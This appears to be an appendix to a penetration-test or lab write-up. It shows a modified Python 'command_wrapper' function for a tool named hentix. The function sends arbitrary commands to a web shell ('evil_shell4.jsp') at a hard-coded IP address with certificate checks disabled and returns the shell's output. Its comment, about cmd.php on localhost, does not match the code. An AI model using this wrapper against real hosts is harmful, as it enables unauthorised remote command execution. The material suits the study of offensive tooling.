# Appendix - Modifications to hentix

The modified command_wrapper function in hentix.py is below:

```python
def command_wrapper(cmd):
    #
    #   Exampe command injection against cmd.php on localhost.
    #   cmd is passed through cmd URL pamameter
    #
    p = {'cmd': cmd}
    url = "https://13.54.255.86/evil_shell4.jsp"
    requests.packages.urllib3.disable_warnings()
    r = requests.get(url, params=p, verify=False)
    start = r.text.find("<pre>") + 5
    end = r.text.find("</pre>")
    return r.text[start:end]
```